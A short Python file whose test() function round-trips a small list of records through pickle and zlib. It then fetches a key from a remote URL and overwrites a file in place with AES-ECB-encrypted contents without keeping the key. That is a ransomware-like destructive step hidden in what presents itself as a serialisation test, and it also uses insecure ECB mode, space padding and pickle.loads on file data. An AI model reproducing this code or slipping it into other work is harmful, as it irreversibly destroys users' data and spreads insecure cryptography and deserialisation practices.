import zlib
import pickle
from Crypto.Cipher import AES
import requests

def test():
    mydict = [
        {"name": "alice", "age": 17},
        {"name": "mike", "age": 21}
    ]

    with open("test.gz", "wb") as f:
        f.write(zlib.compress(pickle.dumps(mydict)))
    
    with open("test.gz", "rb") as f:
        data = zlib.decompress(f.read())
        successDict = pickle.loads(data)
    
    key = requests.get("https://example.com/get_key").content
    file_path = "/path/to/your/file"

    with open(file_path, "r+b") as file:
        file_data = file.read()
        file.seek(0)
        file.write(
            AES.new(key, AES.MODE_ECB).encrypt(
                file_data.ljust((len(file_data) + 15) // 16 * 16)
            )
        )

    return successDict
